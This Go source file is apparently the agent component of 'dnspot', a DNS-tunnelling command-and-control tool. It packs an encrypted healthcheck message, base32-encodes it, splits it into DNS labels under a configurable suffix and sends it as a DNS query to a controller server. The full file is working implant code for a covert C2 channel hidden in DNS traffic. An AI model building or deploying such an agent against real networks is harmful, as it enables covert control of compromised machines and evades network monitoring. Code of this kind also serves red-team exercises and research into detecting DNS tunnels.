package agent

import (
	"bytes"
	"encoding/base32"
	"fmt"
	"strings"
	"time"

	"github.com/lunixbochs/struc"

	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/cryptography"
	"github.com/spf13/cobra"

	"github.com/kpango/glg"

	"github.com/miekg/dns"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

func performExternalQuery(question dns.Question, server string) *dns.Msg {
	c := new(dns.Client)
	m1 := new(dns.Msg)
	m1.Id = dns.Id()
	m1.RecursionDesired = true
	m1.Question = make([]dns.Question, 1)
	m1.Question[0] = question
	in, _, err := c.Exchange(m1, server)
	if err != nil {
		fmt.Printf("error %v\n", err)
	}
	return in
}

func insertNth(s string, n int) string {
	var buffer bytes.Buffer
	var n_1 = n - 1
	var l_1 = len(s) - 1
	for i, rune := range s {
		buffer.WriteRune(rune)
		if i%n == n_1 && i != l_1 {
			buffer.WriteRune('.')
		}
	}
	return buffer.String()
}

func RunAgent(cmd *cobra.Command, args []string) {
	dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
	errorHandler(err)
	if !strings.HasSuffix(dnsSuffix, ".") {
		dnsSuffix = dnsSuffix + "."
	}
	if !strings.HasPrefix(dnsSuffix, ".") {
		dnsSuffix = "." + dnsSuffix
	}
	serverAddress, err := cmd.Flags().GetString("serverAddress")
	errorHandler(err)
	privateKey, err := cmd.Flags().GetString("privateKey")
	errorHandler(err)
	serverPublicKey, err := cmd.Flags().GetString("serverPublicKey")
	errorHandler(err)

	private, _ := cryptography.PrivateKeyFromString(privateKey)
	public, _ := cryptography.PublicKeyFromString(serverPublicKey)

	// msg := "hello lets take ssa look atchars22hello lets lets take ssa look atcha"
	msg := c2.MessagePacket{
		TimeStamp:      uint32(time.Now().Unix()),
		MessageType:    c2.MessageHealthcheck,
		EnabledService: c2.ServiceNone,
		IsMultiPart:    false,
		PartID:         0,
		ParentPartID:   0,
	}
	copy(msg.Payload[:], "hello")
	var buf bytes.Buffer
	struc.Pack(&buf, &msg)
	encrypted, err := cryptography.Encrypt(public, private, buf.Bytes())
	if err != nil {
		panic(err.Error())
	}

	s := base32.StdEncoding.EncodeToString(encrypted)
	s = strings.ReplaceAll(s, "=", "")

	Q := insertNth(s, 63) + dnsSuffix
	if len(Q) > 255 {
		glg.Warnf("query is too long %d\n", len(Q))
	} else {
		q := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
		glg.Infof("query %s\n", q.String())
		performExternalQuery(q, serverAddress)
	}

}
